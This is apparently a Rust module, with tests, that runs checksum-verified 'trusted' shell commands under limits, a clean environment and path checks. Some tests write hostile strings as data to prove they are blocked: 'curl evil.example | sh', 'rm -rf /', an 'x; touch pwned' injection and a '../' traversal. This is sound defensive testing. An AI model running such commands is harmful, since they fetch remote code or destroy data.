use std::collections::HashMap;
use std::io::Read;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::Arc;
use std::time::{Duration, Instant};

use sha2::{Digest, Sha256};

use crate::commands::{check_read_path, Ctx, ExecError, RawOutput};
use crate::parse::{Arg, SimpleCommand};
use crate::sink::DiskQuota;

pub const TRUSTED_NO_PATH_CHECK_FLAG: &str = "--no-path-check";
const SHELL: &str = "/bin/sh";
const DEFAULT_PATH_ENV: &str = "/usr/local/bin:/usr/bin:/bin";
const MEM_LIMIT_BYTES: u64 = 1024 * 1024 * 1024;
const CPU_GRACE_SECS: u64 = 5;

#[derive(Debug, thiserror::Error)]
pub enum TrustedError {
    #[error("i/o error on trusted file: {0}")]
    Io(#[from] std::io::Error),
    #[error("invalid trusted file line {0}: {1}")]
    InvalidLine(usize, String),
    #[error("duplicate trusted command name: {0}")]
    DuplicateName(String),
    #[error("checksum mismatch: trusted file changed since it was validated")]
    ChecksumMismatch,
    #[error("no expected checksum configured (--trusted-sha256)")]
    NoExpectedChecksum,
    #[error("unknown trusted command: {0}")]
    UnknownName(String),
    #[error("home directory for trusted commands would be inside the root")]
    HomeInsideRoot,
}

#[derive(Debug, Clone)]
pub struct TrustedEntry {
    pub name: String,
    pub command: String,
    pub no_path_check: bool,
}

#[derive(Clone)]
pub struct TrustedRegistry {
    path: PathBuf,
    expected_sha256: Option<String>,
    entries: HashMap<String, TrustedEntry>,
    home: PathBuf,
}

impl TrustedRegistry {
    pub fn load(
        path: &Path,
        expected_sha256: Option<String>,
        root: &Path,
    ) -> Result<Self, TrustedError> {
        let content = std::fs::read_to_string(path)?;
        let entries = parse_entries(&content)?;
        let home = make_home(root)?;
        Ok(Self {
            path: path.to_path_buf(),
            expected_sha256,
            entries,
            home,
        })
    }

    pub fn home(&self) -> &Path {
        &self.home
    }

    fn current_sha256(&self) -> Result<String, TrustedError> {
        let bytes = std::fs::read(&self.path)?;
        let digest = Sha256::digest(&bytes);
        Ok(digest.iter().map(|b| format!("{b:02x}")).collect())
    }

    /// Re-reads the trusted file and compares its sha256 against the expected
    /// checksum. Called before every trusted execution (fail-closed).
    pub fn verify(&self) -> Result<(), TrustedError> {
        let Some(expected) = &self.expected_sha256 else {
            return Err(TrustedError::NoExpectedChecksum);
        };
        if self.current_sha256()? != *expected {
            return Err(TrustedError::ChecksumMismatch);
        }
        Ok(())
    }

    pub fn get(&self, name: &str) -> Result<&TrustedEntry, TrustedError> {
        self.entries
            .get(name)
            .ok_or_else(|| TrustedError::UnknownName(name.to_string()))
    }

    /// All declared entries, sorted by name (deterministic `help` output).
    pub fn entries_sorted(&self) -> Vec<&TrustedEntry> {
        let mut entries: Vec<&TrustedEntry> = self.entries.values().collect();
        entries.sort_by(|a, b| a.name.cmp(&b.name));
        entries
    }
}

pub fn sha256_hex(bytes: &[u8]) -> String {
    let digest = Sha256::digest(bytes);
    digest.iter().map(|b| format!("{b:02x}")).collect()
}

fn is_valid_name(name: &str) -> bool {
    let mut chars = name.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
}

fn parse_entries(content: &str) -> Result<HashMap<String, TrustedEntry>, TrustedError> {
    let mut entries = HashMap::new();
    for (idx, raw_line) in content.lines().enumerate() {
        let line_no = idx + 1;
        let line = raw_line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let Some((lhs, rhs)) = line.split_once('=') else {
            return Err(TrustedError::InvalidLine(
                line_no,
                "expected '<name> [flags] = <command>'".to_string(),
            ));
        };
        let command = rhs.trim();
        if command.is_empty() {
            return Err(TrustedError::InvalidLine(
                line_no,
                "empty command".to_string(),
            ));
        }
        let mut parts = lhs.split_whitespace();
        let Some(name) = parts.next() else {
            return Err(TrustedError::InvalidLine(
                line_no,
                "missing name".to_string(),
            ));
        };
        if !is_valid_name(name) {
            return Err(TrustedError::InvalidLine(
                line_no,
                format!("invalid name '{name}'"),
            ));
        }
        let mut no_path_check = false;
        for flag in parts {
            if flag == TRUSTED_NO_PATH_CHECK_FLAG {
                no_path_check = true;
            } else {
                return Err(TrustedError::InvalidLine(
                    line_no,
                    format!("unknown flag '{flag}' (only {TRUSTED_NO_PATH_CHECK_FLAG} is allowed)"),
                ));
            }
        }
        if entries
            .insert(
                name.to_string(),
                TrustedEntry {
                    name: name.to_string(),
                    command: command.to_string(),
                    no_path_check,
                },
            )
            .is_some()
        {
            return Err(TrustedError::DuplicateName(name.to_string()));
        }
    }
    Ok(entries)
}

/// HOME for trusted shells must live outside the root so a trusted command
/// cannot persist anything under the confined perimeter via $HOME.
fn make_home(root: &Path) -> Result<PathBuf, TrustedError> {
    let home = std::env::temp_dir().join(format!("la-console-home-{}", std::process::id()));
    std::fs::create_dir_all(&home)?;
    let canonical_home = std::fs::canonicalize(&home)?;
    let canonical_root = std::fs::canonicalize(root)?;
    if canonical_home.starts_with(&canonical_root) {
        return Err(TrustedError::HomeInsideRoot);
    }
    Ok(canonical_home)
}

fn trusted_to_exec(err: TrustedError) -> ExecError {
    match err {
        TrustedError::Io(err) => ExecError::Denied(format!("trusted file unreadable: {err}")),
        other => ExecError::Denied(other.to_string()),
    }
}

pub(crate) fn run(
    cmd: &SimpleCommand,
    ctx: &Ctx,
    _quota: &Arc<DiskQuota>,
) -> Result<RawOutput, ExecError> {
    let Some(registry) = ctx.trusted.as_ref() else {
        return Err(ExecError::Denied(
            "trusted commands are not configured (--trusted-file)".to_string(),
        ));
    };
    registry.verify().map_err(trusted_to_exec)?;
    let Some(name_arg) = cmd.argv.get(1) else {
        return Err(ExecError::Fail(
            "usage: trusted <name> [args...]".to_string(),
        ));
    };
    if name_arg.glob {
        return Err(ExecError::Denied(
            "glob is not allowed in a trusted command name".to_string(),
        ));
    }
    let entry = registry.get(&name_arg.text).map_err(trusted_to_exec)?;
    let args = &cmd.argv[2..];
    if !entry.no_path_check {
        for arg in args {
            if arg.glob || arg.text.starts_with('-') {
                if arg.glob {
                    return Err(ExecError::Denied(
                        "glob is not allowed in trusted arguments".to_string(),
                    ));
                }
                continue;
            }
            check_read_path(ctx, &arg.text)?;
        }
    }
    exec_trusted(entry, args, ctx, registry.home())
}

fn exec_trusted(
    entry: &TrustedEntry,
    args: &[Arg],
    ctx: &Ctx,
    home: &Path,
) -> Result<RawOutput, ExecError> {
    // rlimits are applied by the shell itself (ulimit), so they constrain only
    // the trusted sub-process and its children — never this console process.
    // `ulimit -f` is in 512-byte blocks (POSIX), the most conservative unit.
    // `ulimit -v` (RLIMIT_AS) does not exist on macOS/BSD: best-effort (`;` +
    // stderr silenced); `-t` and `-f` stay fail-closed (`&&`).
    let mem_kib = MEM_LIMIT_BYTES / 1024;
    let cpu_secs = ctx
        .limits
        .command_timeout_secs
        .saturating_add(CPU_GRACE_SECS);
    let fsize_blocks = ctx.limits.max_command_write_bytes / 512;
    let script = build_script(&entry.command, mem_kib, cpu_secs, fsize_blocks);
    let mut command = Command::new(SHELL);
    command
        .arg("-c")
        .arg(&script)
        .arg(format!("trusted-{}", entry.name))
        .args(args.iter().map(|a| &a.text))
        .current_dir(ctx.resolver.root())
        .env_clear()
        .env("PATH", DEFAULT_PATH_ENV)
        .env("HOME", home)
        .env("LANG", "C.UTF-8")
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    run_child(command, ctx.limits.command_timeout_secs)
}

fn build_script(command: &str, mem_kib: u64, cpu_secs: u64, fsize_blocks: u64) -> String {
    format!(
        "ulimit -v {mem_kib} 2>/dev/null; ulimit -t {cpu_secs} && ulimit -f {fsize_blocks} && {command} \"$@\""
    )
}

fn run_child(mut command: Command, timeout_secs: u64) -> Result<RawOutput, ExecError> {
    let mut child = command
        .spawn()
        .map_err(|e| ExecError::Fail(format!("trusted: cannot spawn shell: {e}")))?;
    let mut stdout_pipe = child.stdout.take().expect("stdout is piped");
    let mut stderr_pipe = child.stderr.take().expect("stderr is piped");
    let reader = std::thread::spawn(move || {
        let mut out = Vec::new();
        let _ = stdout_pipe.read_to_end(&mut out);
        let mut err = Vec::new();
        let _ = stderr_pipe.read_to_end(&mut err);
        (out, err)
    });
    let deadline = Instant::now() + Duration::from_secs(timeout_secs);
    let status = loop {
        match child.try_wait() {
            Ok(Some(status)) => break status,
            Ok(None) => {
                if Instant::now() >= deadline {
                    let _ = child.kill();
                    let _ = child.wait();
                    return Err(ExecError::Limit(format!(
                        "command timed out after {timeout_secs}s"
                    )));
                }
                std::thread::sleep(Duration::from_millis(20));
            }
            Err(err) => {
                let _ = child.kill();
                return Err(ExecError::Fail(format!("trusted: wait failed: {err}")));
            }
        }
    };
    let (stdout, stderr) = reader.join().unwrap_or_else(|_| (Vec::new(), Vec::new()));
    Ok(RawOutput {
        code: exit_code(&status),
        stdout,
        stderr,
    })
}

fn exit_code(status: &std::process::ExitStatus) -> u16 {
    use std::os::unix::process::ExitStatusExt;
    status
        .signal()
        .map(|s| 128 + s)
        .or_else(|| status.code())
        .unwrap_or(1) as u16
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::commands::Limits;
    use crate::parse::parse_input;
    use crate::resolve::Resolver;
    use std::collections::HashMap;
    use std::fs;

    fn registry_for(
        root: &Path,
        content: &str,
        expected: Option<String>,
    ) -> (tempfile::TempDir, TrustedRegistry) {
        let dir = tempfile::tempdir().unwrap();
        let file = dir.path().join("trusted.txt");
        fs::write(&file, content).unwrap();
        let registry = TrustedRegistry::load(&file, expected, root).unwrap();
        (dir, registry)
    }

    fn sha_of(content: &str) -> String {
        sha256_hex(content.as_bytes())
    }

    fn ctx_with(dir: &tempfile::TempDir, trusted: Option<TrustedRegistry>) -> Ctx {
        Ctx {
            resolver: Resolver::new(dir.path()).unwrap(),
            sensibles: vec![],
            secrets: vec![],
            limits: Limits::default(),
            trusted,
        }
    }

    use crate::commands::ExecOutcome;

    fn run_cmd(ctx: &Ctx, cmd: &str) -> Result<ExecOutcome, ExecError> {
        let node = parse_input(cmd, &HashMap::new()).unwrap();
        crate::commands::execute(&node, ctx)
    }

    #[test]
    fn parses_entries_with_comments_and_flags() {
        let entries = parse_entries(
            "# comment\n\nbuild = cargo build --release\nrun-tests --no-path-check = cargo test\n",
        )
        .unwrap();
        assert_eq!(entries.len(), 2);
        assert_eq!(entries["build"].command, "cargo build --release");
        assert!(!entries["build"].no_path_check);
        assert!(entries["run-tests"].no_path_check);
    }

    #[test]
    fn rejects_invalid_lines() {
        assert!(matches!(
            parse_entries("no equals sign"),
            Err(TrustedError::InvalidLine(_, _))
        ));
        assert!(matches!(
            parse_entries("build ="),
            Err(TrustedError::InvalidLine(_, _))
        ));
        assert!(matches!(
            parse_entries("1bad = true"),
            Err(TrustedError::InvalidLine(_, _))
        ));
        assert!(matches!(
            parse_entries("two words = true"),
            Err(TrustedError::InvalidLine(_, _))
        ));
        assert!(matches!(
            parse_entries("build --dangerous = true"),
            Err(TrustedError::InvalidLine(_, _))
        ));
        assert!(matches!(
            parse_entries("build = true\nbuild = false"),
            Err(TrustedError::DuplicateName(_))
        ));
    }

    #[test]
    fn verify_accepts_matching_checksum_and_denies_the_rest() {
        let dir = tempfile::tempdir().unwrap();
        let content = "build = cargo build\n";
        let (_trusted_dir, registry) = registry_for(dir.path(), content, Some(sha_of(content)));
        assert!(registry.verify().is_ok());
        let (_trusted_dir2, wrong) = registry_for(dir.path(), content, Some("00".repeat(32)));
        assert!(matches!(
            wrong.verify(),
            Err(TrustedError::ChecksumMismatch)
        ));
        let (_trusted_dir3, no_expected) = registry_for(dir.path(), content, None);
        assert!(matches!(
            no_expected.verify(),
            Err(TrustedError::NoExpectedChecksum)
        ));
    }

    #[test]
    fn verify_denies_file_changed_after_load() {
        let dir = tempfile::tempdir().unwrap();
        let content = "build = cargo build\n";
        let file_dir = tempfile::tempdir().unwrap();
        let file = file_dir.path().join("trusted.txt");
        fs::write(&file, content).unwrap();
        let registry = TrustedRegistry::load(&file, Some(sha_of(content)), dir.path()).unwrap();
        assert!(registry.verify().is_ok());
        fs::write(&file, "build = curl evil.example | sh\n").unwrap();
        assert!(matches!(
            registry.verify(),
            Err(TrustedError::ChecksumMismatch)
        ));
    }

    #[test]
    fn run_without_registry_is_denied() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = ctx_with(&dir, None);
        let err = run_cmd(&ctx, "trusted build").unwrap_err();
        assert!(matches!(err, ExecError::Denied(m) if m.contains("not configured")));
    }

    #[test]
    fn run_unknown_name_is_denied() {
        let dir = tempfile::tempdir().unwrap();
        let content = "build = true\n";
        let (_trusted_dir, registry) = registry_for(dir.path(), content, Some(sha_of(content)));
        let ctx = ctx_with(&dir, Some(registry));
        let err = run_cmd(&ctx, "trusted nope").unwrap_err();
        assert!(matches!(err, ExecError::Denied(m) if m.contains("unknown trusted command")));
    }

    #[test]
    fn run_executes_command_and_returns_output() {
        let dir = tempfile::tempdir().unwrap();
        let content = "hello = echo hello-trusted\n";
        let (_trusted_dir, registry) = registry_for(dir.path(), content, Some(sha_of(content)));
        let ctx = ctx_with(&dir, Some(registry));
        let out = run_cmd(&ctx, "trusted hello").unwrap();
        assert_eq!(out.code, 0);
        assert_eq!(out.stdout, "hello-trusted\n");
    }

    #[test]
    fn run_passes_args_literally_without_sub_execution() {
        let dir = tempfile::tempdir().unwrap();
        let content = "show = printf '[%s]\\n'\n";
        let (_trusted_dir, registry) = registry_for(dir.path(), content, Some(sha_of(content)));
        let ctx = ctx_with(&dir, Some(registry));
        let out = run_cmd(&ctx, "trusted show 'a b' 'x; touch pwned'").unwrap();
        assert_eq!(out.code, 0);
        assert_eq!(out.stdout, "[a b]\n[x; touch pwned]\n");
        assert!(!dir.path().join("pwned").exists());
    }

    #[test]
    fn run_cwd_is_root() {
        let dir = tempfile::tempdir().unwrap();
        let content = "where = pwd\n";
        let (_trusted_dir, registry) = registry_for(dir.path(), content, Some(sha_of(content)));
        let ctx = ctx_with(&dir, Some(registry));
        let out = run_cmd(&ctx, "trusted where").unwrap();
        assert_eq!(out.code, 0);
        assert_eq!(
            out.stdout.trim(),
            fs::canonicalize(dir.path()).unwrap().to_str().unwrap()
        );
    }

    #[test]
    fn run_env_is_minimal_and_hides_parent_secrets() {
        std::env::set_var("LACONSOLE_TEST_SECRET", "s3cr3t-value");
        let dir = tempfile::tempdir().unwrap();
        let content = "leak = printenv LACONSOLE_TEST_SECRET || true\nhome = printenv HOME\n";
        let (_trusted_dir, registry) = registry_for(dir.path(), content, Some(sha_of(content)));
        let ctx = ctx_with(&dir, Some(registry));
        let out = run_cmd(&ctx, "trusted leak").unwrap();
        assert_eq!(out.code, 0);
        assert!(!out.stdout.contains("s3cr3t-value"));
        let out = run_cmd(&ctx, "trusted home").unwrap();
        let home = out.stdout.trim().to_string();
        assert!(!home.is_empty());
        assert!(!home.starts_with(fs::canonicalize(dir.path()).unwrap().to_str().unwrap()));
    }

    #[test]
    fn run_never_feeds_process_stdin_to_the_command() {
        let dir = tempfile::tempdir().unwrap();
        let content = "readstdin = cat\n";
        let (_trusted_dir, registry) = registry_for(dir.path(), content, Some(sha_of(content)));
        let ctx = ctx_with(&dir, Some(registry));
        let out = run_cmd(&ctx, "trusted readstdin").unwrap();
        assert_eq!(out.code, 0);
        assert!(out.stdout.is_empty());
    }

    #[test]
    fn run_validates_path_args_through_resolve_and_sensibles() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(dir.path().join("ok.txt"), b"ok").unwrap();
        fs::write(dir.path().join(".env"), b"X=1").unwrap();
        let content = "noop = true\n";
        let (_trusted_dir, registry) = registry_for(dir.path(), content, Some(sha_of(content)));
        let mut ctx = ctx_with(&dir, Some(registry));
        ctx.sensibles = vec![regex::Regex::new(r".*\.env$").unwrap()];
        let out = run_cmd(&ctx, "trusted noop ok.txt --verbose").unwrap();
        assert_eq!(out.code, 0);
        let err = run_cmd(&ctx, "trusted noop ../evil.txt").unwrap_err();
        assert!(matches!(err, ExecError::Denied(_)));
        let err = run_cmd(&ctx, "trusted noop .env").unwrap_err();
        assert!(matches!(err, ExecError::Denied(m) if m.contains("sensitive")));
        let err = run_cmd(&ctx, "trusted noop *.txt").unwrap_err();
        assert!(matches!(err, ExecError::Denied(_)));
    }

    #[test]
    fn no_path_check_flag_skips_path_validation() {
        let dir = tempfile::tempdir().unwrap();
        let content = "free --no-path-check = true\n";
        let (_trusted_dir, registry) = registry_for(dir.path(), content, Some(sha_of(content)));
        let ctx = ctx_with(&dir, Some(registry));
        let out = run_cmd(&ctx, "trusted free ../anywhere").unwrap();
        assert_eq!(out.code, 0);
    }

    #[test]
    fn run_denies_when_file_changed_since_validation() {
        let dir = tempfile::tempdir().unwrap();
        let content = "noop = true\n";
        let file_dir = tempfile::tempdir().unwrap();
        let file = file_dir.path().join("trusted.txt");
        fs::write(&file, content).unwrap();
        let registry = TrustedRegistry::load(&file, Some(sha_of(content)), dir.path()).unwrap();
        let ctx = ctx_with(&dir, Some(registry));
        let out = run_cmd(&ctx, "trusted noop").unwrap();
        assert_eq!(out.code, 0);
        fs::write(&file, "noop = rm -rf /\n").unwrap();
        let err = run_cmd(&ctx, "trusted noop").unwrap_err();
        assert!(matches!(err, ExecError::Denied(m) if m.contains("checksum")));
    }

    #[test]
    fn run_kills_child_on_timeout() {
        let dir = tempfile::tempdir().unwrap();
        let content = "slow = sleep 30\n";
        let (_trusted_dir, registry) = registry_for(dir.path(), content, Some(sha_of(content)));
        let mut ctx = ctx_with(&dir, Some(registry));
        ctx.limits.command_timeout_secs = 1;
        let start = Instant::now();
        let err = run_cmd(&ctx, "trusted slow").unwrap_err();
        assert!(matches!(err, ExecError::Limit(m) if m.contains("timed out")));
        assert!(start.elapsed() < Duration::from_secs(10));
    }

    #[test]
    fn script_keeps_going_when_address_space_limit_is_unsupported() {
        // Regression guard for macOS/BSD, where `ulimit -v` (RLIMIT_AS) does
        // not exist: it must be best-effort (`;`) while -t/-f stay fail-closed.
        let script = build_script("echo hi", 1048576, 35, 32768);
        let v_part = script.split("; ").next().unwrap();
        assert!(v_part.starts_with("ulimit -v 1048576 2>/dev/null"));
        assert!(script.contains("ulimit -t 35 && ulimit -f 32768 && echo hi \"$@\""));
    }

    #[test]
    fn run_propagates_nonzero_exit_code() {
        let dir = tempfile::tempdir().unwrap();
        let content = "fail = exit 3\n";
        let (_trusted_dir, registry) = registry_for(dir.path(), content, Some(sha_of(content)));
        let ctx = ctx_with(&dir, Some(registry));
        let out = run_cmd(&ctx, "trusted fail").unwrap();
        assert_eq!(out.code, 3);
    }
}
